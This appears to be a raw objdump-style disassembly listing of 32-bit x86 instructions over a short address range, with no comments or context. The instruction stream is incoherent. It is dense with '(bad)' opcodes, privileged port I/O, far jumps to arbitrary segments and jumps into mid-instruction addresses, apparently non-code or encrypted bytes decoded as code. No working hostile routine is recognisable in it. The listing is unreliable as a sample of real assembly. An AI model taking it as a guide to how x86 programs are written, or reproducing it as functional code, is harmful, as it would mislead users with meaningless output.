  41f813:	cmp    al,0xa7
  41f815:	rcl    BYTE PTR [edi+0x15],cl
  41f818:	pop    ds
  41f819:	je     0x41f817
  41f81b:	pop    ebx
  41f81c:	ins    BYTE PTR es:[edi],dx
  41f81d:	inc    esp
  41f81e:	inc    edi
  41f81f:	loop   0x41f7ee
  41f821:	lea    ecx,[esi+0x16]
  41f824:	inc    eax
  41f825:	pop    ecx
  41f826:	push   ebp
  41f827:	adc    DWORD PTR [edi+0x1b3b5ac3],ebp
  41f82d:	jmp    0x41f85a
  41f82f:	out    dx,al
  41f830:	pop    es
  41f831:	fisub  WORD PTR [edi-0x1c]
  41f834:	pop    esi
  41f835:	mov    ds:0xa19ade5c,eax
  41f83a:	stos   DWORD PTR es:[edi],eax
  41f83b:	lea    edx,[ecx+edx*4+0x5b]
  41f83f:	jmp    DWORD PTR [ebx+0x28f6ba72]
  41f845:	arpl   bp,di
  41f847:	xchg   edi,eax
  41f848:	push   ebp
  41f849:	sbb    DWORD PTR [edx],0xebf7ba33
  41f84f:	push   cs
  41f850:	shr    dh,0x24
  41f853:	dec    eax
  41f854:	pop    ebx
  41f855:	inc    edi
  41f856:	addr16 hlt 
  41f858:	xchg   ebp,eax
  41f859:	xor    BYTE PTR [ebx],ch
  41f85b:	xor    al,0x10
  41f85d:	aaa    
  41f85e:	dec    edx
  41f85f:	jmp    0xd1d3:0xa0de7d7d
  41f866:	add    al,0xf8
  41f868:	lods   al,BYTE PTR ds:[esi]
  41f869:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f86a:	mov    ss,WORD PTR [edx-0x2e]
  41f86d:	pop    esp
  41f86e:	cli    
  41f86f:	fcmovu st,st(7)
  41f871:	retf   
  41f872:	jbe    0x41f7f5
  41f874:	and    ecx,DWORD PTR [edi]
  41f876:	jge    0x41f8a8
  41f878:	cmp    bh,ah
  41f87a:	xor    eax,0x46a96b91
  41f87f:	sbb    dl,BYTE PTR [esi]
  41f881:	shr    esp,cl
  41f883:	pop    esi
  41f884:	stos   DWORD PTR es:[edi],eax
  41f885:	popf   
  41f886:	int3   
  41f887:	loope  0x41f81e
  41f889:	mov    eax,ds:0xca16ac6e
  41f88e:	sar    ebp,cl
  41f890:	test   BYTE PTR [ebx],al
  41f892:	adc    edx,DWORD PTR [edx-0x18]
  41f895:	ret    
  41f896:	or     ecx,eax
  41f898:	fwait
  41f899:	mov    al,ds:0xb9e48e1d
  41f89e:	sbb    al,BYTE PTR gs:[ecx]
  41f8a1:	mov    ah,BYTE PTR [esi-0x4d40a279]
  41f8a7:	push   edx
  41f8a8:	xor    eax,0xb0f09a5
  41f8ad:	adc    eax,0x4f0ad322
  41f8b2:	fs pop ebp
  41f8b4:	mov    esi,0xe8e4c0dd
  41f8ba:	cmp    eax,0x34c37d93
  41f8bf:	mov    DWORD PTR [edi-0x7ec7b244],0x6ecf8d9e
  41f8c9:	sbb    DWORD PTR [edi-0x16dbdd74],0xffffffe4
  41f8d0:	sbb    al,0x57
  41f8d2:	arpl   bp,di
  41f8d4:	test   BYTE PTR [edi+0x7f5f7e37],ch
  41f8da:	and    BYTE PTR [edi+0x9],ch
  41f8dd:	inc    eax
  41f8de:	lock mov WORD PTR [ebx-0x74],cs
  41f8e2:	scas   al,BYTE PTR es:[edi]
  41f8e3:	mov    esi,ss
  41f8e5:	mov    al,ds:0x74878154
  41f8ea:	dec    ecx
  41f8eb:	xchg   edi,eax
  41f8ec:	lds    ebx,FWORD PTR [ebx-0x1a5fa3b7]
  41f8f2:	fild   WORD PTR [esi]
  41f8f4:	dec    esp
  41f8f5:	push   0xffffffee
  41f8f7:	xor    ecx,DWORD PTR [edx]
  41f8f9:	fld    TBYTE PTR [ebx+0x302a7715]
  41f8ff:	sbb    ebp,DWORD PTR [esi+0x49]
  41f902:	sub    dl,BYTE PTR [edi+0x5a]
  41f905:	jne    0x41f955
  41f907:	sbb    edx,ecx
  41f909:	div    BYTE PTR [ecx]
  41f90b:	jo     0x41f975
  41f90d:	dec    ebp
  41f90e:	add    BYTE PTR [edx-0x19],cl
  41f911:	adc    al,0xde
  41f913:	aam    0x31
  41f915:	dec    edi
  41f916:	cmp    DWORD PTR [ebp+edi*4+0x37],edi
  41f91a:	aaa    
  41f91b:	push   eax
  41f91c:	mov    edi,edi
  41f91e:	inc    ecx
  41f91f:	inc    ecx
  41f920:	jae    0x41f8f2
  41f922:	js     0x41f968
  41f924:	loope  0x41f98e
  41f926:	sar    BYTE PTR [ebp+0x76],1
  41f929:	scas   eax,DWORD PTR es:[edi]
  41f92a:	fst    QWORD PTR [ebx]
  41f92c:	mov    ds:0x90037eca,al
  41f931:	add    dh,BYTE PTR [esp+ebp*4]
  41f934:	xchg   esi,eax
  41f935:	lock stos DWORD PTR es:[edi],eax
  41f937:	cmp    ah,BYTE PTR [edx]
  41f939:	shl    BYTE PTR [eax-0x52],1
  41f93c:	sahf   
  41f93d:	push   cs
  41f93e:	xchg   edx,eax
  41f93f:	out    dx,al
  41f940:	mov    bh,0xe6
  41f942:	fist   DWORD PTR [ebx-0x31]
  41f945:	sub    DWORD PTR [edi+0x2a],0x7c
  41f949:	inc    eax
  41f94a:	lock stc 
  41f94c:	andps  xmm2,XMMWORD PTR [ebp+0x35]
  41f950:	cmp    edx,0xae2ebe66
  41f956:	js     0x41f99f
  41f958:	add    DWORD PTR [edx-0x68],ebp
  41f95b:	out    dx,al
  41f95c:	shr    esi,0x18
  41f95f:	sbb    dh,BYTE PTR [ecx+ebx*8]
  41f962:	mov    cl,0x66
  41f964:	push   0xb89d9d78
  41f969:	lock mov al,0xa
  41f96c:	xchg   ebx,eax
  41f96d:	mov    esp,0x1d291ad0
  41f972:	mov    ds:0xebecca2c,eax
  41f977:	mov    ds:0x28b665d9,eax
  41f97c:	aas    
  41f97d:	pop    es
  41f97e:	push   eax
  41f97f:	int    0x3
  41f981:	adc    al,0xe4
  41f983:	adc    bl,cl
  41f985:	cmp    al,0xd1
  41f987:	lea    esi,[ecx-0x60]
  41f98a:	pop    eax
  41f98b:	in     al,dx
  41f98c:	dec    ebx
  41f98d:	dec    edi
  41f98e:	fs adc cl,ch
  41f991:	sbb    bl,al
  41f993:	mov    ds:0xa8bd9c9a,al
  41f998:	sbb    BYTE PTR [ecx-0x54],0x25
  41f99c:	repnz out dx,eax
  41f99e:	push   esi
  41f99f:	test   al,0xb2
  41f9a1:	in     eax,dx
  41f9a2:	mov    ebx,0x8ecff44c
  41f9a7:	aaa    
  41f9a8:	test   eax,0x61283b9a
  41f9ad:	test   BYTE PTR [ebx-0x368e0e90],al
  41f9b3:	in     eax,0xdd
  41f9b5:	mov    al,ds:0xa882355a
  41f9ba:	mov    ecx,0x6333557e
  41f9bf:	call   0xe516ab73
  41f9c4:	int3   
  41f9c5:	outs   dx,BYTE PTR ds:[esi]
  41f9c6:	jb     0x41f9e9
  41f9c8:	(bad)  
  41f9c9:	repz mov bl,BYTE PTR [eax]
  41f9cc:	sub    DWORD PTR [eax],esi
  41f9ce:	cs push ebp
  41f9d0:	add    esi,DWORD PTR [eax]
  41f9d2:	jmp    0x41f96d
  41f9d4:	fst    DWORD PTR [esp+eiz*8-0x5e]
  41f9d8:	pop    esp
  41f9d9:	mov    bh,0x4f
  41f9db:	cmp    eax,0x722d83c4
  41f9e0:	call   0x6b72:0x85facfd0
  41f9e7:	in     al,0x3c
  41f9e9:	push   esp
  41f9ea:	lea    eax,[ebp-0x6968a87d]
  41f9f0:	mov    ecx,0xb550ec7
  41f9f5:	data16 lahf 
  41f9f7:	mov    bh,0xc3
  41f9f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9fa:	adc    edi,ebx
  41f9fc:	jmp    0x9466198e
  41fa01:	xor    eax,0x893837f3
  41fa06:	and    edx,DWORD PTR [edx]
  41fa08:	in     al,0x23
  41fa0a:	dec    esp
  41fa0b:	inc    eax
  41fa0c:	add    al,0x95
  41fa0e:	push   0x62
  41fa10:	(bad)  
  41fa11:	std    
  41fa12:	xor    dh,BYTE PTR [ecx+ecx*8+0x28]
  41fa16:	inc    ebp
  41fa17:	mov    ecx,0x58bdc455
  41fa1c:	into   
  41fa1d:	arpl   bp,sp
  41fa1f:	xchg   BYTE PTR [eax],dl
  41fa21:	(bad)  
  41fa22:	sub    al,BYTE PTR [eax+0x44]
  41fa25:	out    0xf3,eax
  41fa27:	xchg   edx,eax
  41fa28:	and    BYTE PTR [ebx-0x1b],cl
  41fa2b:	cmp    DWORD PTR [eax-0x6e],ebx
  41fa2e:	jl     0x41f9d3
  41fa30:	nop
  41fa31:	call   0x43d0:0xa715022e
  41fa38:	sar    DWORD PTR [ebx+esi*1-0x1e],1
  41fa3c:	in     eax,dx
  41fa3d:	sbb    BYTE PTR [esi],0x31
  41fa40:	mov    cl,0x92
  41fa42:	push   ss
  41fa43:	jmp    0xa82797df
  41fa48:	jns    0x41f9ff
  41fa4a:	xchg   edx,eax
  41fa4b:	test   al,0x43
  41fa4d:	pop    es
  41fa4e:	jne    0x41fa02
  41fa50:	cmp    BYTE PTR [ebp+0x32411c],bl
  41fa56:	fst    QWORD PTR [eax]
  41fa58:	mov    BYTE PTR [esi],ch
  41fa5a:	mov    ch,BYTE PTR [edi-0x14f5e6af]
  41fa60:	sub    eax,0x2854621d
  41fa65:	rol    BYTE PTR [esi-0x2f],0x73
  41fa69:	push   ss
  41fa6a:	ret    
  41fa6b:	fwait
  41fa6c:	xchg   ecx,eax
  41fa6d:	jo     0x41fa63
  41fa6f:	mov    esp,DWORD PTR [esi-0x60]
  41fa72:	aas    
  41fa73:	jmp    0xf13d4a24
  41fa78:	jnp    0x41faf7
  41fa7a:	mov    edx,0xa4a8402f
  41fa7f:	mov    BYTE PTR [ecx-0x3],dh
  41fa82:	dec    eax
  41fa83:	dec    ecx
  41fa84:	inc    edi
  41fa85:	jno    0x41faa9
  41fa87:	inc    ebp
  41fa88:	fistp  DWORD PTR [eax+ebx*1]
  41fa8b:	out    0x34,eax
  41fa8d:	and    BYTE PTR [ecx-0x20],0x11
  41fa91:	arpl   bp,bx
  41fa93:	in     eax,0xf5
  41fa95:	(bad)  
  41fa96:	and    ah,BYTE PTR [ecx+esi*2-0x67d1992b]
  41fa9d:	pushf  
  41fa9e:	inc    edx
  41fa9f:	leave  
  41faa0:	in     al,dx
  41faa1:	ins    DWORD PTR es:[edi],dx
  41faa2:	adc    BYTE PTR [ebx+0x2b9c93e6],ch
  41faa8:	int    0x84
  41faaa:	push   0xffffffd7
  41faac:	inc    DWORD PTR [eax]
  41faae:	ret    0xa95b
  41fab1:	int    0xfd
  41fab3:	jge    0x41fb0d
  41fab5:	enter  0x7042,0x21
  41fab9:	int    0x48
  41fabb:	js     0x41fa68
  41fabd:	bound  ecx,QWORD PTR [ebx-0x7a997502]
  41fac3:	jle    0x41fab0
  41fac5:	leave  
  41fac6:	pop    esp
  41fac7:	sub    DWORD PTR [eax+edi*2+0x5fdfc07f],esi
  41face:	in     al,0x49
  41fad0:	mov    esi,0x36b44a30
  41fad5:	push   ebp
  41fad6:	outs   dx,DWORD PTR ds:[esi]
  41fad7:	retf   0x1d7e
  41fada:	mov    al,ds:0xa5356820
  41fadf:	adc    DWORD PTR [ebp-0x4ee59b11],edi
  41fae5:	and    edx,DWORD PTR [bx+si+0x0]
  41fae9:	add    BYTE PTR [eax+0x4a],bl
  41faec:	dec    edx
  41faed:	push   edi
  41faee:	pop    edx
  41faef:	push   edi
  41faf0:	pop    ebp
  41faf1:	dec    edi
  41faf2:	mov    dh,0x0
  41faf4:	dec    edx
  41faf5:	push   ecx
  41faf6:	(bad)  
  41faf7:	mov    ch,0x5a
  41faf9:	sbb    BYTE PTR [edx+ecx*4+0x1],0x0
  41fafe:	xchg   BYTE PTR [esi],al
  41fb00:	add    BYTE PTR [eax],al
  41fb02:	mov    al,ds:0x35a2578f
  41fb07:	test   eax,0xe57bd10c
  41fb0c:	add    eax,0xdf611fd2
  41fb11:	mov    ebp,0x40146b8c
  41fb16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb17:	or     BYTE PTR [edx-0x1],0xf3
  41fb1b:	cs push 0x3260f420
  41fb21:	(bad)  [esi]
  41fb23:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41fb25:	xchg   ebp,eax
  41fb26:	gs jg  0x41fb09
  41fb29:	(bad)  
  41fb2b:	loop   0x41fae0
  41fb2d:	(bad)  
  41fb2e:	push   esp
  41fb2f:	xchg   ebx,eax
  41fb30:	mov    esi,0x9fe65968
  41fb35:	add    BYTE PTR [ecx],al
  41fb37:	fxch   st(4)
  41fb39:	sbb    BYTE PTR [ecx+0x54],dl
  41fb3c:	xchg   dl,cl
  41fb3e:	and    al,0x94
  41fb40:	or     eax,0x80343b95
  41fb45:	data16 out 0xc1,al
  41fb48:	or     dl,al
  41fb4a:	or     BYTE PTR [esi+0x6b],bh
  41fb4d:	iret   
  41fb4e:	push   ecx
  41fb4f:	imul   eax,esi,0xd861c1a7
  41fb55:	sahf   
  41fb56:	mov    al,ds:0xfe03a21c
  41fb5b:	and    BYTE PTR [edx],al
  41fb5d:	(bad)  
  41fb5e:	mov    esp,0xd851a8c7
  41fb63:	rol    al,cl
  41fb65:	adc    dh,BYTE PTR [ebx+0x16]
  41fb68:	jcxz   0x41fb9c
  41fb6b:	xchg   edi,eax
  41fb6c:	dec    esi
  41fb6d:	in     eax,dx
  41fb6e:	pushf  
  41fb6f:	xchg   esp,eax
  41fb70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb71:	add    edx,DWORD PTR [eax+0x66bd4b64]
  41fb77:	mov    esp,0xf7315022
  41fb7c:	adc    DWORD PTR [esi],0xffffffc5
  41fb7f:	jno    0x41fbea
  41fb81:	lock loop 0x41fb72
  41fb84:	fwait
  41fb85:	mov    ds:0x8c805e23,eax
  41fb8a:	popf   
  41fb8b:	and    al,0x7f
  41fb8d:	push   cs
  41fb8e:	sbb    bl,dh
  41fb90:	fidiv  WORD PTR [eax+0x78f73391]
  41fb96:	outs   dx,BYTE PTR ds:[esi]
  41fb97:	and    esi,DWORD PTR [ecx-0x4b]
  41fb9a:	and    eax,0x6a18822f
  41fb9f:	add    eax,0xdb910bd3
  41fba4:	push   0x8dbfc89d
  41fba9:	mov    ch,0x7
  41fbab:	(bad)  [esi-0x4dc445e3]
  41fbb1:	mov    ebp,0x60211cb8
  41fbb6:	mov    ebx,0xa4baed88
  41fbbb:	mov    esp,0x8d60cad
  41fbc0:	adc    dh,BYTE PTR [esi+0x22463904]
  41fbc6:	and    dh,BYTE PTR [esp+edx*4+0x19]
  41fbca:	enter  0x1183,0x4e
  41fbce:	sub    DWORD PTR [eax],ebx
  41fbd0:	push   cs
  41fbd1:	mov    dh,0xba
  41fbd3:	xchg   ebp,eax
  41fbd4:	cmp    DWORD PTR [ecx-0x79],eax
  41fbd7:	test   BYTE PTR [ebx-0x56],dh
  41fbda:	in     al,dx
  41fbdb:	mov    ah,0xd3
  41fbdd:	and    ebp,ebp
  41fbdf:	inc    esi
  41fbe0:	xor    DWORD PTR [ecx+0x2e],ebx
  41fbe3:	pop    es
  41fbe4:	rcl    BYTE PTR [edx+0x277b7e65],0x8a
  41fbeb:	es pop edi
  41fbed:	pop    ecx
  41fbee:	cmp    BYTE PTR [ecx],0x77
  41fbf1:	xchg   DWORD PTR [ecx+0x2],edx
  41fbf4:	add    eax,0xf3292a49
  41fbf9:	jle    0x41fc44
  41fbfb:	inc    edx
  41fbfc:	cmp    eax,0x524bb485
  41fc01:	sti    
  41fc02:	jle    0x41fc24
  41fc04:	arpl   WORD PTR [eax+ebx*4],dx
  41fc07:	(bad)  
  41fc09:	leave  
  41fc0a:	clc    
  41fc0b:	xchg   edx,eax
  41fc0c:	dec    ecx
  41fc0d:	sub    al,0x5e
  41fc0f:	push   ebx
  41fc10:	pop    es
  41fc11:	xchg   edi,eax
  41fc12:	es mov edx,0xc8979b61
  41fc18:	xchg   ecx,eax
  41fc19:	mov    ebp,0x40698da3
  41fc1e:	aad    0x81
  41fc20:	jbe    0x5636ca2f
  41fc26:	inc    DWORD PTR [ebp+0x1c8ac7bc]
  41fc2c:	aam    0x78
  41fc2e:	(bad)  
  41fc2f:	push   ebx
  41fc30:	push   ebx
  41fc31:	inc    edi
  41fc32:	js     0x41fc22
  41fc34:	mov    es,ebx
  41fc36:	in     al,dx
  41fc37:	pop    ds
  41fc38:	xor    cl,BYTE PTR [ebp+0x52fbc680]
  41fc3e:	sbb    eax,0xab795bf0
  41fc43:	popa   
  41fc44:	add    cl,BYTE PTR [ebx-0x4a637d9b]
  41fc4a:	dec    edi
  41fc4b:	iret   
  41fc4c:	inc    edx
  41fc4d:	xchg   esi,eax
  41fc4e:	cmp    al,0xec
  41fc50:	outs   dx,BYTE PTR ds:[esi]
  41fc51:	xor    BYTE PTR [eax-0x3b803a94],cl
  41fc57:	mov    ebp,0xb54d1859
  41fc5c:	(bad)  
  41fc5d:	pop    edi
  41fc5e:	and    al,0x5c
  41fc60:	rcl    DWORD PTR [esi+eax*2-0x5e],1
  41fc64:	pop    esi
  41fc65:	addr16 push ecx
  41fc67:	mov    DWORD PTR [edx-0x6a],0xbbf1aad0
  41fc6e:	fcmovnb st,st(3)
  41fc70:	repz add eax,0x357faa8a
  41fc76:	mov    esi,0x40df4c9d
  41fc7b:	ja     0x41fcaa
  41fc7d:	sbb    eax,0x5ef2a806
  41fc82:	mov    ch,0x54
  41fc84:	mov    eax,ds:0xc4d89538
  41fc89:	add    BYTE PTR [ebx-0x57],dh
  41fc8c:	dec    esi
  41fc8d:	and    BYTE PTR [ebx+0x8],ch
  41fc90:	(bad)  
  41fc91:	adc    BYTE PTR [eax+0xc4ecb50],bl
  41fc97:	daa    
  41fc98:	fdiv   st(3),st
  41fc9a:	pop    ebp
  41fc9b:	jo     0x41fc6f
  41fc9d:	in     al,dx
  41fc9e:	sbb    al,al
  41fca0:	rcr    ch,cl
  41fca2:	pop    ecx
  41fca3:	ss push ss
  41fca5:	xor    cl,ah
  41fca7:	xchg   ebp,eax
  41fca8:	retf   0x110
  41fcab:	lods   al,BYTE PTR ds:[esi]
  41fcac:	xor    BYTE PTR [edx],0x93
  41fcaf:	pop    edx
  41fcb0:	test   DWORD PTR ds:0x888618d2,esp
  41fcb6:	sub    DWORD PTR [ebx],esi
  41fcb8:	mov    eax,0xed355a81
  41fcbd:	pop    es
  41fcbe:	shl    DWORD PTR [ecx],1
  41fcc0:	inc    ebp
  41fcc1:	loope  0x41fc96
  41fcc3:	out    0x38,eax
  41fcc5:	call   0xea1a69a5
  41fcca:	dec    esi
  41fccb:	iret   
  41fccc:	das    
  41fccd:	(bad)  
  41fcce:	into   
  41fccf:	ret    
  41fcd0:	add    ah,ch
  41fcd2:	into   
  41fcd3:	pop    ss
  41fcd4:	call   0x1f318138
  41fcd9:	in     al,0xef
  41fcdb:	scas   eax,DWORD PTR es:[edi]
  41fcdc:	fld    DWORD PTR [edx-0x58b57de9]
  41fce2:	enter  0x7e10,0xe1
  41fce6:	mov    ds:0xcd298f79,eax
  41fceb:	push   ss
  41fcec:	jecxz  0x41fd24
  41fcee:	xchg   DWORD PTR [edx],esi
  41fcf0:	shl    DWORD PTR [eax+esi*4-0x30],cl
  41fcf4:	ja     0x41fd5d
  41fcf6:	jo     0x41fcdf
  41fcf8:	es test al,0x55
  41fcfb:	mov    cl,0xbd
  41fcfd:	dec    esp
  41fcfe:	push   eax
  41fcff:	xor    al,0xca
  41fd01:	cmc    
  41fd02:	push   es
  41fd03:	stc    
  41fd04:	dec    ebp
  41fd05:	repz jl 0x41fd67
  41fd08:	xor    bl,BYTE PTR [ebx+0x71]
  41fd0b:	cwde   
  41fd0c:	xor    ah,0x58
  41fd0f:	cli    
  41fd10:	in     al,0xe5
  41fd12:	sbb    DWORD PTR ds:0xfbca6fef,ebx
  41fd18:	out    0xcc,al
  41fd1a:	jle    0x41fd2d
  41fd1c:	pusha  
  41fd1d:	or     dh,bl
  41fd1f:	(bad)  
  41fd20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd21:	iret   
  41fd22:	imul   esi,DWORD PTR [eax+0x7d],0x65
  41fd26:	retf   0xfc07
  41fd29:	xor    bl,BYTE PTR [ebx]
  41fd2b:	xor    al,bl
  41fd2d:	push   eax
  41fd2e:	out    0x8d,al
  41fd30:	mov    esp,0x9b6776da
  41fd35:	xor    esi,0xa5622b80
  41fd3b:	or     DWORD PTR [ecx-0x6102fff6],ecx
  41fd41:	pop    ds
  41fd42:	xchg   edx,eax
  41fd43:	adc    ch,BYTE PTR [ecx+0x2da9c118]
  41fd49:	out    dx,al
  41fd4a:	jg     0x41fdb3
  41fd4c:	call   0x9eaed09a
  41fd51:	std    
  41fd52:	repnz jecxz 0x41fd8b
  41fd55:	stos   DWORD PTR es:[edi],eax
  41fd56:	push   edx
  41fd57:	cmp    eax,0x936988ef
  41fd5c:	(bad)  
  41fd5d:	push   edi
  41fd5e:	push   edx
  41fd5f:	sub    BYTE PTR [esi+0x5f6f1cd7],dh
  41fd65:	stos   BYTE PTR es:[edi],al
  41fd66:	xor    DWORD PTR [eax],eax
  41fd68:	and    al,0x43
  41fd6a:	imul   edx,DWORD PTR [edx-0x64910207],0xe147254d
  41fd74:	inc    ebp
  41fd75:	ins    BYTE PTR es:[edi],dx
  41fd76:	add    cl,BYTE PTR [edi]
  41fd78:	xchg   ebx,eax
  41fd79:	ret    0x2a42
  41fd7c:	pop    edi
  41fd7d:	mov    eax,ds:0xc9016ad8
  41fd82:	jmp    0xdcea:0x8e33fee4
  41fd89:	mov    esp,esp
  41fd8b:	pop    edi
  41fd8c:	push   edi
  41fd8d:	imul   DWORD PTR [ecx+0x7e]
  41fd90:	(bad)  
  41fd91:	pop    ebx
  41fd92:	retf   
  41fd93:	pop    ebx
  41fd94:	dec    esi
  41fd95:	xchg   dl,ch
  41fd97:	xchg   edi,ecx
  41fd99:	inc    edi
  41fd9a:	pop    esp
  41fd9b:	mov    ecx,0xd4ae6fae
  41fda0:	xor    eax,0x5a369ee5
  41fda5:	jnp    0x41fd53
  41fda7:	mov    ds:0xe7d9bb63,al
  41fdac:	inc    edi
  41fdad:	mov    edi,0xccbd7107
  41fdb2:	add    cl,BYTE PTR [edx+edx*4-0x2]
  41fdb6:	sub    ah,ch
  41fdb8:	or     DWORD PTR [ebp-0x7],ebp
  41fdbb:	xor    eax,0xf330fd80
  41fdc0:	dec    eax
  41fdc1:	pop    edi
  41fdc2:	fs stos BYTE PTR es:[edi],al
  41fdc4:	pushf  
  41fdc5:	mov    bl,ah
  41fdc7:	jb     0x41fd78
  41fdc9:	pop    ecx
  41fdca:	fst    st(3)
  41fdcc:	mov    ds:0xc02fb379,al
  41fdd1:	iret   
  41fdd2:	mov    ds:0xb714190e,al
  41fdd7:	jp     0x41fdf6
  41fdd9:	mov    al,ds:0xaad00374
  41fdde:	call   0x93d3:0x9e164f8b
  41fde5:	cmp    al,0xc5
  41fde7:	cwde   
  41fde8:	jbe    0x41fd7f
  41fdea:	loope  0x41fe44
  41fdec:	or     DWORD PTR [esi],ebx
  41fdee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdef:	jmp    0x41fe2e
  41fdf1:	(bad)  
  41fdf2:	sub    BYTE PTR [esi+0x6d9133d4],ch
  41fdf8:	adc    al,0x2e
  41fdfa:	mov    eax,ds:0x11093e99
  41fdff:	lea    eax,[eax-0x62]
  41fe02:	popf   
  41fe03:	xor    BYTE PTR [edx+0x69082e8f],cl
  41fe09:	pushf  
  41fe0a:	arpl   WORD PTR [edi+0x17b71f22],cx
  41fe10:	shr    esp,cl
  41fe12:	test   eax,0x28427f12
  41fe17:	sub    eax,0x2dc59a2a
  41fe1c:	shl    DWORD PTR [ebp+0x6d],cl
  41fe1f:	(bad)  
  41fe20:	imul   esi,edi,0x85aa299a
  41fe26:	add    dh,ch
  41fe28:	aas    
  41fe29:	out    0x6e,eax
  41fe2b:	push   eax
  41fe2c:	mov    cs,WORD PTR [edi+eiz*2]
  41fe2f:	or     DWORD PTR [esi+0x9],0xffffff92
  41fe33:	ret    
  41fe34:	jge    0x41fdb8
  41fe36:	sub    eax,0x826dad4c
  41fe3b:	cwde   
  41fe3c:	jmp    0x8364:0xfda5bc95
  41fe43:	jmp    0xf757be5c
  41fe48:	push   cs
  41fe49:	jecxz  0x41fe7a
  41fe4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe4c:	push   es
  41fe4d:	lea    eax,[esi+eiz*8+0x1120d74d]
  41fe54:	dec    ebx
  41fe55:	test   ax,0x15af
  41fe59:	sar    dl,0xbf
  41fe5c:	aad    0xc5
  41fe5e:	dec    edi
  41fe5f:	fist   WORD PTR [eax+edx*8-0x7c]
  41fe63:	call   0x6050436b
  41fe68:	das    
  41fe69:	mov    esi,?
  41fe6b:	cmp    bh,BYTE PTR [ecx-0x17]
  41fe6e:	pop    es
  41fe6f:	mov    ds:0x7ef372ec,eax
  41fe74:	js     0x41feb6
  41fe76:	and    dh,bh
  41fe78:	call   0x98b8e3fa
  41fe7d:	js     0x41feb2
  41fe7f:	jl     0x41fe96
  41fe81:	mov    cl,0xc0
  41fe83:	jle    0x41feb7
  41fe85:	xlat   BYTE PTR ds:[ebx]
  41fe86:	rcl    DWORD PTR [ecx-0x8ad3269],cl
  41fe8c:	push   0x11
  41fe8e:	das    
  41fe8f:	je     0x41fe97
  41fe91:	mov    ebp,0x57380037
  41fe96:	sub    esp,DWORD PTR [esi]
  41fe98:	push   ecx
  41fe99:	push   edi
  41fe9a:	cmp    esp,esi
  41fe9c:	sbb    al,BYTE PTR [eax-0x7ebf78c1]
  41fea2:	stos   BYTE PTR es:[edi],al
  41fea3:	mov    cs,WORD PTR [esi]
  41fea5:	out    0xaa,eax
  41fea7:	dec    esi
  41fea8:	pop    es
  41fea9:	xchg   edx,eax
  41feaa:	loop   0x41feea
  41feac:	fild   WORD PTR [edi+0x3d]
  41feaf:	pop    ecx
  41feb0:	xchg   esi,eax
  41feb1:	das    
  41feb2:	adc    DWORD PTR [edx],eax
  41feb4:	push   0x6f5c81b9
  41feb9:	xor    DWORD PTR [eax-0x55311879],edi
  41febf:	les    edi,FWORD PTR [ebx]
  41fec1:	sahf   
  41fec2:	lods   eax,DWORD PTR ds:[esi]
  41fec3:	dec    eax
  41fec4:	xor    esi,DWORD PTR [eax-0x7a1f849c]
  41feca:	mov    edx,0x7203bb1e
  41fecf:	cdq    
  41fed0:	push   0x4c
  41fed2:	push   0xffffffab
  41fed4:	jle    0x41fefc
  41fed6:	cld    
  41fed7:	retf   0x3c51
  41feda:	mov    eax,0x725c039d
  41fedf:	outs   dx,DWORD PTR ds:[esi]
  41fee0:	pushf  
  41fee1:	pop    esi
  41fee2:	or     eax,DWORD PTR [edi+0x26]
  41fee5:	pop    esi
  41fee6:	aam    0x55
  41fee8:	mov    ebx,0x35c7d8cb
  41feed:	xor    eax,0x7a546591
  41fef2:	dec    ebx
  41fef3:	retf   
  41fef4:	and    BYTE PTR [esi],ch
  41fef6:	xchg   BYTE PTR [ebx+ebx*2+0x70],al
  41fefa:	xchg   ebp,eax
  41fefb:	iret   
  41fefc:	cmp    al,BYTE PTR [edi]
  41fefe:	mov    ebp,cs
  41ff00:	push   eax
  41ff01:	(bad)  
  41ff02:	mov    edx,0xc9c17173
  41ff07:	mov    ebp,0x7dacb6e0
  41ff0c:	hlt    
  41ff0d:	xchg   edx,eax
  41ff0e:	in     eax,dx
  41ff0f:	sbb    eax,0xf321cbda
  41ff14:	js     0x41fe9b
  41ff16:	dec    eax
  41ff17:	ret    0xc7a1
  41ff1a:	inc    edi
  41ff1b:	aam    0x4
  41ff1d:	ja     0x41ff2d
  41ff1f:	scas   al,BYTE PTR es:[edi]
  41ff20:	push   ebp
  41ff21:	inc    edx
  41ff22:	retf   
  41ff23:	pop    ecx
  41ff24:	imul   esp,DWORD PTR [ebx+0x5],0x8086e9fc
  41ff2b:	aad    0x18
  41ff2d:	cmp    esp,ecx
  41ff2f:	pslld  mm4,QWORD PTR [edx]
  41ff32:	(bad)  
  41ff33:	fmul   st(6),st
  41ff35:	pop    edi
  41ff36:	cmp    al,0x78
  41ff38:	push   esi
  41ff39:	retf   0x5f6e
  41ff3c:	sub    ah,dh
  41ff3e:	inc    edi
  41ff3f:	dec    edi
  41ff40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff41:	pop    es
  41ff42:	or     DWORD PTR [edi],ecx
  41ff44:	dec    esi
  41ff45:	out    0xc9,al
  41ff47:	jg     0x41fef2
  41ff49:	mov    ecx,0x1de51bfc
  41ff4e:	and    ebx,edi
  41ff50:	dec    ebx
  41ff51:	push   edi
  41ff52:	ret    0x3c1
  41ff55:	xchg   ah,cl
  41ff57:	cmp    dl,BYTE PTR [ebp-0x448d54af]
  41ff5d:	mov    ebp,0x40ce3743
  41ff62:	clc    
  41ff63:	ror    DWORD PTR [edi+0x48551aba],1
  41ff69:	pusha  
  41ff6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff6b:	lods   eax,DWORD PTR ds:[esi]
  41ff6c:	fwait
  41ff6d:	aaa    
  41ff6e:	out    0x77,al
  41ff70:	mov    dh,0x95
  41ff72:	and    dh,BYTE PTR [esi-0x26626101]
  41ff78:	xchg   esp,eax
  41ff79:	data16 jp 0x41ffcb
  41ff7c:	cmp    bl,BYTE PTR [ecx-0x30be12]
  41ff82:	es inc ebx
  41ff84:	imul   al
  41ff86:	outs   dx,BYTE PTR ds:[esi]
  41ff87:	stc    
  41ff88:	pushf  
  41ff89:	lahf   
  41ff8a:	sahf   
